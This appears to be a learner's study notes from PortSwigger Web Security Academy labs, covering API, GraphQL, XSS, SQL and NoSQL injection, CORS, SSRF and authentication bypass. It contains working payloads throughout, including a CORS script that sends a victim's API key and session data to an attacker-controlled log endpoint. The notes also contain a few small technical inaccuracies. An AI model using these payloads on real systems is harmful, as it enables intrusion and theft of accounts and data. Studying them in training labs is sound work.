<h1>PortSwigger academy</h1>

<h3>Please forgive my grammar. i like to write whatever that comes into my mind first and edit it later</h3>

## Table of Contents
- [Portswigger labs](#Portswigger-labs)
- [API Pentesting](#API-Pentesting)
  - [GraphQL](#GraphQL)
- [XSS](#cross-site-scripting-xss)
- [SQL Injection](#SQL-injection)
  - [NoSQL Injection](#NoSQL-injection)
- [CORS](#CORS)
- [SSRF](#SSRF)
- [Authentication](#Authentication)
- [My conclusion](#My-conclusion)

## Portswigger labs

<h3>Lab link: https://portswigger.net/web-security/all-labs</h3>

## <h2>API Pentesting</h2>

<h3>API Enumeration</h3> 

 web fuzzing using **Burp Scanner** (alternative way is web fuzzer such as Feroxbuster or OWASP ZAP)

| API Endpoint Enumeration  | Method |
| ------------- | ------------- |
| Burp Scanner  | automation process  |
| Read API doc  | usually in /api directory  |
| Hidden API endpoint | Burp intruder or Gobuster |


It is also worth checking on JSON, YAML or any JavaScript files as it may contain API endpoints.

| HTTP Method  | Desc. |
| ------------- | ------------- |
| GET  | request resources  |
| POST  | submit requests  |
| Patch | update or modify |



When constructing a request, the JSON format is usually look like this in Burp Suite

```
{
  "username": tester,
  "password": tester
}
```

<h3>Identifying supported HTTP methods</h3>

Basically use **OPTIONS** to see available HTTP options. In HTB, this technique is called **HTTP Tampering** 

<h3>Type Confusion</h3>

The web server sometimes interprets the request differently if the content type isn't what it expect to be.

Usually it involves around **content-type**

```
Example

Content-type: Application/json

This tells the web server, this request contains JSON data
```

<h3>Hidden API endpoint</h3>

Let say you found 
```
POST /api/user/add
```

You can try to fuzzing other endpoint in **/add** using wordlists. You might find other endpoints that look like **/api/user/delete**, **/api/user/update** etc using **Burp Intruder**.

<h3>Mass Assignment Vulnerability</h3>

This attack allows the attackers to insert unknown data parameters in hidden parameters.

```
{
    "id": 123,
    "name": "John Doe",
    "email": "john@example.com",
    "isAdmin": "false"
}
```

<h3>Server-side parameter pollution</h3>

This attacks allows the attackers to inject payload in input which later on will be sent to internal system where external users couldnt access. If the input isn't sanitize, it could lead to unauthorized access.It is worth checking every input in API endpoints. We could use query syntax like #, &, = to test.

**Test scenario**
```
GET /userSearch?name=peter&back=/home
```

Use **#** to test. **%23** is the encoded format of #

```
GET /userSearch?name=peter%23foo&back=/home
```

**How website process request through URL path vs API?**

![image](https://github.com/user-attachments/assets/46627c6a-ceb5-450a-93b9-d21ec38353bf)

**Path Traversal in API**

```
GET /edit_profile.php?name=peter%2f..%2fadmin
```

if name parameter isn't sanitize, the web server coould interpret it as **name=peter/../admin**. This /../ is like cd i think.

<h3>Server-side pollution with structured data</h3>

```
POST /myaccount
name=peter","access_level":"administrator
```

We can try to add **access_level** parameter to escalate privielge.

in case it is in JSON 

```
POST /myaccount
{"name": "peter\",\"access_level\":\"administrator"}
```

<h1>We can use Burp Pro feature to automate the process!</h1>


<h1>Resources</h1>

API endpoint wordlists - https://github.com/chrislockard/api_wordlist

Server-Side Prototype Pollution Scanner - https://portswigger.net/blog/server-side-prototype-pollution-scanner

<h1>Recap & keywords</h1>

1. API enumeration = /api, API doc, Burp Scanner

2. API request enumeration = HTTP tampering, OPTIONS

3. Hidden API endpoints = POST /api/user/??? use Burp intruder

4. Server-side Pollution = try query syntax such as & # = in every parameter. For example **name=eheh&name=eheheh**, Server-Side Prototype Pollution Scanner, access_level=administrator etc

## <h2>GraphQL</h2>

**Trick: GraphQL uses the same endpoints for all requests. This means if you found 1 GraphQL API endpoint you can find the rest API endpoints!**

When we encounter GraphQL, the first thing we need to do it find its endpoint! 

The following query is a universal query for GraphQL

```
query{__typename}
```

so when this query is called the JSON data usually look like this 

```
{ "data": {"__typename": "query"} }
```

Basically a nested JSON parameter. Every GraphQL JSON query always has **__typename**.

When we want to verify GraphQL, we can try these following:

```
/graphql
/api
/api/graphql
/graphql/api
/graphql/graphql
```

**Note: When you have tried the above endpoints and couldn't find the endpoint, you may try /v1**

**Note2: GraphQL usually responds to non-GraphQL request with "query not present" or something similar.**

<h3>Exploit IDOR or BAC via unsanitized query input</h3>

Usually if the web app uses GraphQL for accessing data, we can play with query. This query sometimes unsanitizes which allows us to access resources.

**GraphQL checked, unsanitized checked. What's next?**

We can use "introspection". It is a built-in GraphQL function which spits out information like API docs and description. These informations are considered a sensitive information. Using:

```
{
        "query": "{__schema{queryType{name}}}"
    }
```

if the introspection doesn't retrieve the schema, try removeing **onOperation**, **onFragment**,and **onField**

if **Introspection is disabled**, we can try built-in suggestions function. This is an alternative way to exploit GraphQL information schema(in this scenario these schema are sensitive data).

**GraphQL exploitation in a nutshell**

Firstly, check that the web app i using GraphQL through requests.

Secondly, after verified the web app is using GraphQL, you can use Burp to perform information schema scanner.

Thirdly, read the schema and find sensitive query, then in the request, you add that sensitiv query to uncover the secret!

**Example**

1. check for GraphQL(very easy to detect)

![image](https://github.com/user-attachments/assets/4f1c03cf-7b55-420f-a97a-dc26d8a9a60d)

2. check for Introspection function. if it enables then you can search information schema

![image](https://github.com/user-attachments/assets/35d9fac4-9179-4f8b-87bb-2ab7b69d28d2)

3. next, in the login page. let's inspect the GraphQL query using inQL extension

![image](https://github.com/user-attachments/assets/5e9d6e7d-597e-4f37-93f1-4492a4e749de)

4. As you can see, getUser query is being called during authentication. Now we can try to copy & paste this query in login request adn change id = 1 since the first id is admin

![image](https://github.com/user-attachments/assets/109ecad3-3815-4e5e-81a1-4b044cb014ce)

Easy peasy. The keypoint is to learn how query work in information schema!

<h3>Bypass GraphQL introsepction defense</h3>

We could try new line, spaces and commas

```
#Introspection query with newline

    {
        "query": "query{__schema
        {queryType{name}}}"
    }
```

The example is shown how we can bypass defense by using new line!

or we can bypass with URL path!

```
GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
```

<h3>GraphQL CSRF</h3>

This attack vector allows attackers to perform CSRF via GET request or the content type is **x-www-form-urlencoded** instead of **application/json** or use Burp pro feature called **Generate CSRF PoC**

**Example**

From JSON 

```
{"query":"\n    mutation changeEmail($input: ChangeEmailInput!) {\n        changeEmail(input: $input) {\n            email\n        }\n    }\n","operationName":"changeEmail","variables":{"input":{"email":"heeh@hehe.hehe"}}}
```

to

URL encoded

```
query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D
```

or

```
query=
    mutation changeEmail($input: ChangeEmailInput!) {
        changeEmail(input: $input) {
            email
        }
    }
&operationName=changeEmail&variables={"input":{"email":"hacker@hacker.com"}}
```


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


## <h2>Cross-site Scripting (XSS)</h2>

Reflected XSS, where the malicious script comes from the current HTTP request.

Stored XSS, where the malicious script comes from the website's database.

DOM-based XSS, where the vulnerability exists in client-side code rather than server-side code.

<h2>Automated tool with Burp Pro Vulnerability Scanner feature</h2>

Details: https://portswigger.net/burp/vulnerability-scanner

<h2>Content security policy</h2>

Content security policy or CSP is used to detect XSS.

DOM-based XSS 

Let say 

```
<img src="/resources/images/tracker.gif?searchTerms=">
```

We can try to create img script tag by 

```
"><svg onload=alert(1)> 
```

So, it will look like this

```
<img src="/resources/images/tracker.gif?searchTerms="><svg onload=alert(1)>
```
Basically just another tag in HTML


<h1>Resources</h1>

XSS cheatsheet - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## <h2>SQL Injection</h2>

Can be found especially in queries

Useful command when we want to know more about table information.

```
SELECT * FROM information_schema.tables
```

If you want to see tables you can try to exploit it with union-based sql injection.

```
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```

In case we want to retreive tables more than one, we can use concatenation to achieve that.

```
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

<h3>How to test SQL injection</h3>

Use ' = if there is SQL error message, this means the web app is vulnerable to SQL injection

Ex.

```
https://insecure-website.com/products?category=Gifts'--
```

This means that the statement after -- will be recognized as a comment. In this case the only part that SQL statement will be execute is ?category=Gift

```
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

**Boolean conditions** checks for conditions

try

```
OR 1=1 # this always returns true
```

or

```
OR 1=2 
```

<h1>THE EASIEST WAY TO DETECT SQL INJECTION IS TO USE BURP SCANNER!</h1>

**Union Injection**

**How to check for database information?**

| Database  | Command |
| ------------- | ------------- |
| Microsoft, MySQL  | SELECT @@version |
| Oracle |SELECT * FROM v$version |
| PostgreSQL | SELECT version() |


Basically retrieve the another table by using UNION. It allows attackers to use SELECT command twice.

```
' UNION SELECT username, password FROM users--
```

Normally, when we test union injection. Firstly, check how many columns the table have. Secondly check which column has a suitable datatype. so that we can use SQL statement to retreive the respective data we want to expose.

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

another way

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

**In Oracle database**

We have to add **DUAL** after SELECT / FROM because it is a bult-in. Can't run without it.

```
' UNION SELECT NULL FROM DUAL--
```

**Oracle SQL injection exaple**

```
Accessories'+UNION+SELECT+banner,NULL+FROM+v$version--
```

<h2>WAF Bypass</h2>

We can encode or we can obfuscate the sql statement to bypass the WAF.

Ex. The below is XML-based SQL injection

```
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

If we want to bypass specific technology, Burp suite provides many extension to help us bypass WAF. For example, if we want to bypass WAF that is implemented in XML, we can use Hackvertor extension to encode our SQL injection command to potentially bypass WAF.



**Out-of-band application security testing (OAST)**

This attacks uses external service to retreive SQL injection attack results. In Burp Suite, it has a dedicated testing server which allows users to perform OOB. This is useful when perform blind sql injection

the SQL injection might work but it doesn't show an error. We can use time delay to identify that or add additional logic condition to trigger an error.

```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

The above cookie is a tracking cookie. This cookie is vulnerable to SQL injection since the value of TrackingID is basically SQL statement. However, we couldnt simply use union to exploit this instead we use blind sql injection.

Example

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

The above sql statement checks for administrator in Users table with the logic 1 = 1 is always true. if it is valid then it is greater than m. This means that as long as the welcome back notification is triggered. the result is positive. Now we know the first character of this user's password we can try

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

This time the welcome back notification didn't show up. This means that the letter t isn't the 2nd character of the user's password. Now we try "s".

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 's
```

This time it returns a welcome back message, indicating valid statement.

In conclusion, so far we that this user's password is start with "m" and the second letter is "s". we repeat the process until we found a valid password.


## <h2>NoSQL Injection</h2>

A famouse database. It is different from traditional databases because it uses different query languages. 

Because of the variety of query that's why we can abuse many query syntax as there are many diffrent methods we can try.

**How do we test NoSQL injection?**

the concept is as the same as how we try to exploit sql injection

try:

```
'"`{
;$Foo}
$Foo \xYZ
```

in JSON query try:

```
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```

**NoSQL statement check**

False statement

```
Gifts' && 0 && 'x
```

True statement

```
Gifts' && 1 && 'x
```

Always true

```
Gifts'||1||'
```

We can also try to add null value. This works like a comment.

```
'%00
```

The result of null value is whatever statement after null value won't be processed. That's how MongoDB intreprets

**NoSQL injection with Operator Injection**


| Operator  | Meaning |
| ------------- | ------------- |
| $where  | Matches documents that satisfy a JavaScript expression. |
| $ne  |Matches all values that are not equal to a specified value. |
| $in | Matches all of the values specified in an array. |
| $regex | Selects documents where values match a specified regular expression. |

To exploit NoSQL Operator Injection, we can try nested objects.

In JSON

**{"username":"wiener"} becomes {"username":{"$ne":"invalid"}}**

In URL path

**username[$ne]=invalid**

<h3>Things to do if URL path doesn't work:</h3>

1. HTTP tampering. Change GET to POST
2. Change the content-type to Application/json
3. Do it in JSON query

<h3>I won't go deeper like how to manual exploit this. The reason is i just want to know how it work and how can i detect it. If i want to exploitm i will use automating tool </h3>

<h1>Resources</h1>

SQL injection cheatsheet - https://portswigger.net/web-security/sql-injection/cheat-sheet

NoSQL automating tool - https://github.com/codingo/NoSQLMap


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## <h2>CORS</h2>

CORS or cross origin resource sharing is a browser mechanism, allowing the web app to use resource across domains. However, if this browser mechanism isn't well implemented, it could become an attacker vector.

SOP or same origin policy is a stricted origin policy. It allows a domain to request to other domains but it couldn't interact with resources.

**The vulnerability lies in the CORS misconfiguration**

How can we know the web app is vulnerable to CORS attack?

We can look at the response request, if the request contains **Access-Control-Allow-Credentials: true**, it uses CORS. Furthurmore, This header allows users to pass credentials in the request as well.

![image](https://github.com/user-attachments/assets/7f428fa4-1228-4214-97ad-7317d560c31e)

**Example**

If the web app is indeed vulnerable, we add Origin: anything and observe the response request.

```
GET /accountDetails HTTP/2
Host: 0a7e002a0386c18a826a063b003d00cb.web-security-academy.net
Cookie: session=HeU2poPXNDfV1PVYHZUs1y64nKtb5iND
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a7e002a0386c18a826a063b003d00cb.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Origin: https://google.com
```

Response request

```
HTTP/2 200 OK
Access-Control-Allow-Origin: https://google.com
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149
{
  "username": "wiener",
  "email": "",
  "apikey": "rgP0rUMKyM1EKlPJomojHMsmxeQChdH9",
  "sessions": [
    "HeU2poPXNDfV1PVYHZUs1y64nKtb5iND"
  ]
}
```

What happens here is that when we add the "Origin" header and the web app return the origin source as a trusted source. This becomes a problem because this web app trust any origin source from 3rd parties and subdomains.

**Script example**

```
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```


Trusted subdomains are also vulnerable to cors attack. If attackers found any one of subdomains that are vulnerable to XSS. They can use those subdomains as origin source and embed script in the request in the form of XHR script. The concept is pretty much similar. You can just use the vulnerable subdomain in Origin header!

<h3>CORS attack scenario in a nutshell</h3>

Let say you make a request and the response request has **Access-Control-Allow-Credentials: true**. The first assumption is this web app is using CORS. CORS is there to make a request from external 3rd parties and subdomains. Next, we can use burp suite to request another request but this time with **Origin: URL**. If it works you will see the reflected origin url in the response request. Now, we are certain that this web app is vulnerable. Because of **Access-Control-Allow-Credentials: true** we can embed a javascript to steal API or session token and send it to the attacker's machine using XHR. XHR is API that allows users to use script in HTML. The attackers also need their web server running with js script that is waiting for the API token from the request and then save it in let say log.txt or whatever file that specified in the js script. Basically XSS in XHR. 

<h3>Mitigation</h3>

-Use the whitelist. all subdomains should be listed in this whitelist as a trusted source. And make sure none of the subdomains have XSS vulnerability.

-Never used CORS as a security policies as its machanism is intended for accessing 3rd parties resources.

-Don't use null or wildcards in CORS.

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## SSRF

SSRF or server-side reforgery is a technique that attempt to make a web server to force a connection to the external host. in a general situation, SSRF allows attacker to send a request as a web server to the internal host. Basically this technique makes the internal host believes we are a web server!

**Example**

Let say you want to see products in stock. So you request "stock" function. What happens here is the server is calling the corresponding API to access data in the internal. Then returns the output on the web app.

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```
so what happens if the query param is

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin
```

This result is the request will be sent to the localhost and accessing admin directory. In general, when you access **/admin** via websites, you will have to login first but when you're accessing the **/admin** via the localhost. The server recognizes you as the admin without asking you to login. This causes unauthorized access.

![image](https://github.com/user-attachments/assets/f7a374ce-fbfe-4b44-85fe-639d1555fcac)

Next we have to find the API for deleting users

![image](https://github.com/user-attachments/assets/9b45f0b7-7314-45be-a920-07cec3f37098)

Once we find it we make another request but this time use this API instead of a localhost.

![image](https://github.com/user-attachments/assets/5477139a-6615-4992-91eb-95c4db6b1e2a)

<h3>Bypass SSRF filters</h3>

1. Some SSRF filters may detects and removes "127.0.0.1" or "localhost". In this casem we can use **2130706433**, **017700000001**, or **127.1**.

2. In /etc/hosts, use a new dns that resolve to 127.0.0.1 and then use this dns in the vulnerable function.

3. Obfuscate special letters with URL encoded.




------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Authentication

<h3>What kind of vulnerabilities can we found here?</h3>

-Brute forcing

-User enumeration

-Weak cryptographic hash

<h3>Authentication weaknesses</h3>

1. Weak authorization mechanism (like easy password policy)

2. Weak authentication mechanism or poor logic code.

You can think of it as your house's front door. Wooden doors are tended to break easily, unlike metal doors that are strongly dullable.

<h3>So, to the main question, how can we exploit it?</h3> (In the real world scenario, if i don't know the password policy or see valid passwords, i won't waste my time trying to guess passwords lol.)

1. Brute-force attacks - very self explanatory

**Tips: If you found HTTP authentication, you can list it down as a finding. HTTP authenticatoin isn't a good way to implement security as it can be used to brute-force, MiTM, session token hijacking. Normally HTTP authentication stores creds in the Authentication header in base64 format. Unless the web app is implementing HSTS**

<h3>Bypass multi-factor authentication</h3>(Personally, i am very eager to exploit this!)

It is come to how the web security handle the login process, for some website, it asks users to enter a verification code after redirects users to another page. This "another page" is a landing dashboard page. Basically you are already authenticated, but you need a verification code to be able to interact. So the question is if we can bypass this process, we can potentially bypass it!. So in conclusion bypassing authorization is more like finding a way to abuse code logic!


In the given scenario

All you need to do is inspecting requests through Burp. Normally in the lab, after you login you will be redirected to **/my-account**. But because there is 2FA authenthication, it redirects you another page for additional verification, we can use modify the request using intercept and then point it to **GET /my-account** lol.

![image](https://github.com/user-attachments/assets/68a41850-cabf-456a-9733-87dd483b7fe4)

Another scenario

In this scenario the web app is storing username or account-related info in cookies. **This is super duper dangerous as attackers can simply change data in cookies!**

![image](https://github.com/user-attachments/assets/7493c4ae-6d4d-4333-96fb-a06ba4dc084a)



What happens here is: credes are stored in cookies with verify param in the header(it was Wiener but it was testing soemthing so i changed it to Carlos)

After you logged in and verified 2FA. The 2FA request will look like this.

![image](https://github.com/user-attachments/assets/7de45b97-2ff7-4d4f-ba00-68c146dc3164)

Next, we can try to change verify=carlos and send the request to intruder. so that can brute force it!

![image](https://github.com/user-attachments/assets/c544c682-8e31-4158-aa6b-8b1ab9dc4394)


<h3>Additional authentication mechanism</h3>

any mechanism that required authentication is vulnerable to this issue. For example, some websites have a feature such as "Remember me" to keep a session alive. Some websites are even stored a password as a part of session token. In terms of security perspective, it is crucial to make this token unpredictable to kae it impossible for attackers to craft a valid token. However, what if the vulnerable website implenting a weak concatenation? the anwser is yes they f**ked up big time! As this "Remember Me" sessions are usually bypass 2FA authentication!

![image](https://github.com/user-attachments/assets/45200280-5f3d-4054-86a0-cac54097267b)

As you can see from the above image. The token session is stored in Base64 format. If we use Burp, we can see it in a plain text.

using Crackstation or Hash-identifier will give us a plain text password and type of encryption.

![image](https://github.com/user-attachments/assets/4bc331de-a5a9-4ce0-ad16-25aa381e3160)

<h3>Weak password resetting mechanism</h3>

If password resetting is done by sending a new password in email, then it isn't considered to be safe. Think about it, if users have signed in to multiple devices and let say one of them allows attacker to intercept the network traffic using MiTM?

Some websites make it easier for attackers to understand how the function work. The best approach here is to make it hard for attackers understand the function by using the combination of hash and encryption.

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


## My-conclusion

In the end, web pentesting is all about finding a way to interact with the web server. as long as websites are allowed users to interact with web servers, there ARE always a way to exploit or misuse it. With that being said, there are mainly 2 things I can do.

1. Play under their games. I can try to figure out how the web app work first. then find a way to exploit those functions using general knowlege or creativity lol.

2. Human psychology. If all functions are hardcoded and i couldnt crack any function, i can use human psychology using techniques like phishing, spear-phising, vishing etc. Although i might not be able to use it in pentesting. this is quite useful to know.

**Web pentesting in a nutshell. As long as there is a way to interact with the web server, the possibilities are limitless!**

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
